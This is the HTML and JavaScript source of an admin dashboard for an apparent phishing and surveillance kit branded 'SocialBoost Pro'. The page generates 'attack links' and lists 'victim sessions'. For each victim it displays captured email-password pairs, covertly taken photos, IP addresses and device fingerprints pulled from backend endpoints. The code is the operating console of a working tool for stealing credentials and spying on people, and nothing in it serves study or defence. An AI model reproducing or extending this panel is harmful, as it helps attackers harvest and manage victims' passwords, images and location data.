<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SocialBoost Pro - Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a1a;
            color: #fff;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .header h1 {
            font-size: 28px;
            background: linear-gradient(90deg, #c084fc, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            background: rgba(236,73,153,0.2);
            color: #ec4899;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px;
            border: 1px solid rgba(236,73,153,0.3);
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.05);
            text-align: center;
        }
        .stat-card .number {
            font-size: 32px;
            font-weight: 700;
            color: #c084fc;
        }
        .stat-card .label {
            font-size: 12px;
            color: rgba(255,255,255,0.5);
            margin-top: 5px;
        }
        .stat-card .number.credentials {
            color: #f472b6;
        }
        .stat-card .number.ips {
            color: #60a5fa;
        }
        .btn-primary {
            background: linear-gradient(90deg, #c084fc, #ec4899);
            border: none;
            color: #fff;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(192,132,252,0.3);
        }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            border: none;
            color: #fff;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.2);
        }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .sessions {
            margin-top: 30px;
        }
        .sessions h3 {
            margin-bottom: 15px;
            color: rgba(255,255,255,0.7);
        }
        .session-item {
            background: rgba(255,255,255,0.03);
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 3px solid rgba(255,255,255,0.1);
            flex-wrap: wrap;
            gap: 10px;
        }
        .session-item.active {
            border-left-color: #c084fc;
        }
        .session-id {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #c084fc;
        }
        .session-status {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }
        .status-active {
            background: rgba(192,132,252,0.2);
            color: #c084fc;
        }
        .status-waiting {
            background: rgba(255,255,255,0.1);
            color: rgba(255,255,255,0.5);
        }
        .session-details {
            font-size: 12px;
            color: rgba(255,255,255,0.4);
        }
        .session-details .ip-info {
            color: #60a5fa;
            font-family: 'Courier New', monospace;
        }
        .link-box {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border: 1px solid rgba(255,255,255,0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .copy-btn {
            background: rgba(255,255,255,0.1);
            border: none;
            color: #fff;
            padding: 4px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
        }
        .copy-btn:hover {
            background: rgba(255,255,255,0.2);
        }
        .view-btn {
            background: rgba(192,132,252,0.2);
            border: 1px solid rgba(192,132,252,0.3);
            color: #c084fc;
            padding: 4px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 11px;
        }
        .view-btn:hover {
            background: rgba(192,132,252,0.3);
        }
        .view-btn.credentials-btn {
            border-color: rgba(244,114,182,0.3);
            color: #f472b6;
        }
        .view-btn.credentials-btn:hover {
            background: rgba(244,114,182,0.2);
        }
        .view-btn.ips-btn {
            border-color: rgba(96,165,250,0.3);
            color: #60a5fa;
        }
        .view-btn.ips-btn:hover {
            background: rgba(96,165,250,0.2);
        }
        .no-sessions {
            color: rgba(255,255,255,0.3);
            text-align: center;
            padding: 40px 0;
        }
        .session-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .session-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 SocialBoost Pro - Admin</h1>
        <span class="badge">🔴 LIVE</span>
    </div>
    
    <div class="stats" id="stats">
        <div class="stat-card">
            <div class="number" id="totalSessions">0</div>
            <div class="label">Total Sessions</div>
        </div>
        <div class="stat-card">
            <div class="number" id="activeSessions">0</div>
            <div class="label">Active</div>
        </div>
        <div class="stat-card">
            <div class="number" id="totalPhotos">0</div>
            <div class="label">Photos Captured</div>
        </div>
        <div class="stat-card">
            <div class="number credentials" id="totalCredentials">0</div>
            <div class="label">🔐 Credentials</div>
        </div>
        <div class="stat-card">
            <div class="number ips" id="totalIPs">0</div>
            <div class="label">🌐 IPs Tracked</div>
        </div>
    </div>
    
    <div class="btn-group">
        <button class="btn-primary" id="generateBtn">🎯 Generate New Attack Link</button>
        <button class="btn-secondary" id="refreshBtn">🔄 Refresh</button>
    </div>
    
    <div id="newLinkContainer" style="display: none;">
        <div class="link-box">
            <span id="linkText">Loading...</span>
            <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
        </div>
    </div>
    
    <div class="sessions">
        <h3>📊 Victim Sessions</h3>
        <div id="sessionsList">
            <p class="no-sessions">No sessions yet. Generate a link to start.</p>
        </div>
    </div>

    <script>
        let currentLink = '';

        // View photos
        async function viewPhotos(sessionId) {
            try {
                const res = await fetch(`/api/photos/${sessionId}`);
                const data = await res.json();
                
                if (data.photos && data.photos.length > 0) {
                    const win = window.open('', '_blank');
                    win.document.write(`
                        <html>
                        <head>
                            <title>📸 Captured Photos</title>
                            <style>
                                body { 
                                    font-family: 'Segoe UI', sans-serif; 
                                    background: #0a0a1a; 
                                    color: #fff; 
                                    padding: 20px; 
                                    display: flex;
                                    flex-wrap: wrap;
                                    gap: 20px;
                                    justify-content: center;
                                }
                                .photo-card {
                                    background: rgba(255,255,255,0.05);
                                    border-radius: 16px;
                                    padding: 16px;
                                    border: 1px solid rgba(255,255,255,0.1);
                                    width: 320px;
                                    text-align: center;
                                }
                                .photo-card img {
                                    width: 100%;
                                    border-radius: 12px;
                                    border: 2px solid rgba(192,132,252,0.2);
                                }
                                .photo-card .meta {
                                    font-size: 11px;
                                    color: rgba(255,255,255,0.4);
                                    margin-top: 8px;
                                }
                                h1 {
                                    background: linear-gradient(90deg, #c084fc, #ec4899);
                                    -webkit-background-clip: text;
                                    -webkit-text-fill-color: transparent;
                                    width: 100%;
                                    text-align: center;
                                }
                                .back-btn {
                                    background: rgba(255,255,255,0.1);
                                    border: none;
                                    color: #fff;
                                    padding: 10px 24px;
                                    border-radius: 10px;
                                    cursor: pointer;
                                    font-size: 14px;
                                    width: 100%;
                                    margin-bottom: 20px;
                                }
                                .back-btn:hover {
                                    background: rgba(255,255,255,0.2);
                                }
                            </style>
                        </head>
                        <body>
                            <button class="back-btn" onclick="window.close()">⬅ Close</button>
                            <h1>📸 Captured Photos</h1>
                            ${data.photos.map(p => `
                                <div class="photo-card">
                                    <img src="${p.image}" alt="Captured photo" />
                                    <div class="meta">
                                        ${new Date(p.timestamp).toLocaleString()}
                                    </div>
                                </div>
                            `).join('')}
                            ${data.photos.length === 0 ? '<p style="color:rgba(255,255,255,0.3);width:100%;text-align:center;">No photos</p>' : ''}
                        </body>
                        </html>
                    `);
                    win.document.close();
                } else {
                    alert('No photos found for this session.');
                }
            } catch (err) {
                alert('Failed to load photos: ' + err.message);
            }
        }

        // View credentials
        async function viewCredentials(sessionId) {
            try {
                const res = await fetch(`/api/credentials/${sessionId}`);
                const data = await res.json();
                
                if (data.credentials && data.credentials.length > 0) {
                    const win = window.open('', '_blank');
                    win.document.write(`
                        <html>
                        <head>
                            <title>🔐 Captured Credentials</title>
                            <style>
                                body { 
                                    font-family: 'Segoe UI', sans-serif; 
                                    background: #0a0a1a; 
                                    color: #fff; 
                                    padding: 20px; 
                                    display: flex;
                                    flex-direction: column;
                                    align-items: center;
                                    gap: 16px;
                                }
                                .cred-card {
                                    background: rgba(255,255,255,0.05);
                                    border-radius: 16px;
                                    padding: 20px 24px;
                                    border: 1px solid rgba(244,114,182,0.2);
                                    width: 100%;
                                    max-width: 500px;
                                    display: flex;
                                    justify-content: space-between;
                                    align-items: center;
                                    flex-wrap: wrap;
                                    gap: 10px;
                                }
                                .cred-card .email {
                                    color: #c084fc;
                                    font-weight: 600;
                                }
                                .cred-card .password {
                                    color: #f472b6;
                                    font-family: 'Courier New', monospace;
                                }
                                .cred-card .time {
                                    font-size: 11px;
                                    color: rgba(255,255,255,0.3);
                                    width: 100%;
                                }
                                h1 {
                                    background: linear-gradient(90deg, #c084fc, #ec4899);
                                    -webkit-background-clip: text;
                                    -webkit-text-fill-color: transparent;
                                    text-align: center;
                                }
                                .back-btn {
                                    background: rgba(255,255,255,0.1);
                                    border: none;
                                    color: #fff;
                                    padding: 10px 24px;
                                    border-radius: 10px;
                                    cursor: pointer;
                                    font-size: 14px;
                                    width: 100%;
                                    max-width: 500px;
                                }
                                .back-btn:hover {
                                    background: rgba(255,255,255,0.2);
                                }
                            </style>
                        </head>
                        <body>
                            <button class="back-btn" onclick="window.close()">⬅ Close</button>
                            <h1>🔐 Captured Credentials</h1>
                            ${data.credentials.map(c => `
                                <div class="cred-card">
                                    <span class="email">📧 ${c.email}</span>
                                    <span class="password">🔑 ${c.password}</span>
                                    <span class="time">${new Date(c.timestamp).toLocaleString()}</span>
                                </div>
                            `).join('')}
                            ${data.credentials.length === 0 ? '<p style="color:rgba(255,255,255,0.3);">No credentials</p>' : ''}
                        </body>
                        </html>
                    `);
                    win.document.close();
                } else {
                    alert('No credentials found for this session.');
                }
            } catch (err) {
                alert('Failed to load credentials: ' + err.message);
            }
        }

        // View IPs
        async function viewIPs(sessionId) {
            try {
                const res = await fetch(`/api/ips/${sessionId}`);
                const data = await res.json();
                
                const win = window.open('', '_blank');
                win.document.write(`
                    <html>
                    <head>
                        <title>🌐 IP Tracker</title>
                        <style>
                            body { 
                                font-family: 'Segoe UI', sans-serif; 
                                background: #0a0a1a; 
                                color: #fff; 
                                padding: 20px; 
                                display: flex;
                                flex-direction: column;
                                align-items: center;
                                gap: 16px;
                            }
                            .ip-card {
                                background: rgba(255,255,255,0.05);
                                border-radius: 16px;
                                padding: 20px 24px;
                                border: 1px solid rgba(96,165,250,0.2);
                                width: 100%;
                                max-width: 500px;
                            }
                            .ip-card .ip {
                                color: #60a5fa;
                                font-family: 'Courier New', monospace;
                                font-size: 18px;
                                font-weight: 700;
                            }
                            .ip-card .time {
                                font-size: 11px;
                                color: rgba(255,255,255,0.3);
                                margin-top: 4px;
                            }
                            .device-card {
                                background: rgba(255,255,255,0.03);
                                border-radius: 12px;
                                padding: 16px 20px;
                                border: 1px solid rgba(255,255,255,0.05);
                                width: 100%;
                                max-width: 500px;
                            }
                            .device-card .label {
                                color: rgba(255,255,255,0.4);
                                font-size: 11px;
                            }
                            .device-card .value {
                                color: #c084fc;
                                font-size: 13px;
                            }
                            h1 {
                                background: linear-gradient(90deg, #c084fc, #ec4899);
                                -webkit-background-clip: text;
                                -webkit-text-fill-color: transparent;
                                text-align: center;
                            }
                            .back-btn {
                                background: rgba(255,255,255,0.1);
                                border: none;
                                color: #fff;
                                padding: 10px 24px;
                                border-radius: 10px;
                                cursor: pointer;
                                font-size: 14px;
                                width: 100%;
                                max-width: 500px;
                            }
                            .back-btn:hover {
                                background: rgba(255,255,255,0.2);
                            }
                            .section-title {
                                color: rgba(255,255,255,0.5);
                                font-size: 14px;
                                margin-top: 10px;
                                width: 100%;
                                max-width: 500px;
                            }
                        </style>
                    </head>
                    <body>
                        <button class="back-btn" onclick="window.close()">⬅ Close</button>
                        <h1>🌐 IP Tracker & Device Fingerprint</h1>
                        
                        <div class="section-title">📡 IP Addresses (${data.ips ? data.ips.length : 0})</div>
                        ${data.ips && data.ips.length > 0 ? data.ips.map(ip => `
                            <div class="ip-card">
                                <div class="ip">${ip.ip}</div>
                                <div class="time">${new Date(ip.timestamp).toLocaleString()}</div>
                            </div>
                        `).join('') : '<p style="color:rgba(255,255,255,0.3);">No IPs tracked</p>'}

                        <div class="section-title">🖥️ Device Fingerprint</div>
                        ${data.devices && data.devices.length > 0 ? data.devices.map(d => `
                            <div class="device-card">
                                <div><span class="label">Browser:</span> <span class="value">${d.userAgent || 'N/A'}</span></div>
                                <div><span class="label">Platform:</span> <span class="value">${d.platform || 'N/A'}</span></div>
                                <div><span class="label">Screen:</span> <span class="value">${d.screenWidth || '?'}x${d.screenHeight || '?'}</span></div>
                                <div><span class="label">Timezone:</span> <span class="value">${d.timezone || 'N/A'}</span></div>
                                <div><span class="label">Language:</span> <span class="value">${d.language || 'N/A'}</span></div>
                                <div style="font-size:10px;color:rgba(255,255,255,0.2);margin-top:4px;">${new Date(d.timestamp).toLocaleString()}</div>
                            </div>
                        `).join('') : '<p style="color:rgba(255,255,255,0.3);">No device info</p>'}
                    </body>
                    </html>
                `);
                win.document.close();
            } catch (err) {
                alert('Failed to load IPs: ' + err.message);
            }
        }

        // Fetch dashboard
        async function fetchDashboard() {
            try {
                const res = await fetch('/api/dashboard');
                const data = await res.json();
                
                const sessions = data.sessions || [];
                document.getElementById('totalSessions').textContent = sessions.length;
                document.getElementById('activeSessions').textContent = sessions.filter(s => s.status === 'ACTIVE').length;
                document.getElementById('totalPhotos').textContent = sessions.reduce((sum, s) => sum + (s.photos || 0), 0);
                document.getElementById('totalCredentials').textContent = sessions.reduce((sum, s) => sum + (s.credentials || 0), 0);
                document.getElementById('totalIPs').textContent = sessions.reduce((sum, s) => sum + (s.ips || 0), 0);
                
                const list = document.getElementById('sessionsList');
                if (sessions.length === 0) {
                    list.innerHTML = '<p class="no-sessions">No sessions yet. Generate a link to start.</p>';
                    return;
                }
                
                list.innerHTML = sessions.map(s => `
                    <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
                        <div class="session-info">
                            <div class="session-id">${s.id}</div>
                            <div class="session-details">
                                Clicks: ${s.clicks} · Photos: ${s.photos} · Credentials: ${s.credentials || 0} · 
                                IPs: ${s.ips || 0} · Created: ${new Date(s.created).toLocaleString()}
                                ${s.lastIp && s.lastIp !== 'N/A' ? `<span class="ip-info"> · Last IP: ${s.lastIp}</span>` : ''}
                            </div>
                        </div>
                        <div class="session-actions">
                            <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
                            ${s.photos > 0 ? `<button class="view-btn" onclick="viewPhotos('${s.id}')">📸 Photos</button>` : ''}
                            ${s.credentials > 0 ? `<button class="view-btn credentials-btn" onclick="viewCredentials('${s.id}')">🔐 Creds</button>` : ''}
                            ${s.ips > 0 ? `<button class="view-btn ips-btn" onclick="viewIPs('${s.id}')">🌐 IP</button>` : ''}
                        </div>
                    </div>
                `).join('');

            } catch (err) {
                console.error('Failed to fetch dashboard:', err);
            }
        }

        // Generate link
        document.getElementById('generateBtn').addEventListener('click', async () => {
            try {
                const res = await fetch('/api/generate', { method: 'POST' });
                const data = await res.json();
                
                currentLink = data.link;
                document.getElementById('linkText').textContent = currentLink;
                document.getElementById('newLinkContainer').style.display = 'block';
                
                setTimeout(fetchDashboard, 1000);
            } catch (err) {
                alert('Failed to generate link: ' + err.message);
            }
        });

        function copyLink() {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(currentLink).then(() => {
                    alert('✅ Link copied to clipboard!');
                }).catch(() => fallbackCopy());
            } else {
                fallbackCopy();
            }
        }

        function fallbackCopy() {
            const textarea = document.createElement('textarea');
            textarea.value = currentLink;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Link copied!');
        }

        document.getElementById('refreshBtn').addEventListener('click', fetchDashboard);

        fetchDashboard();
        setInterval(fetchDashboard, 10000);
    </script>
</body>
</html>
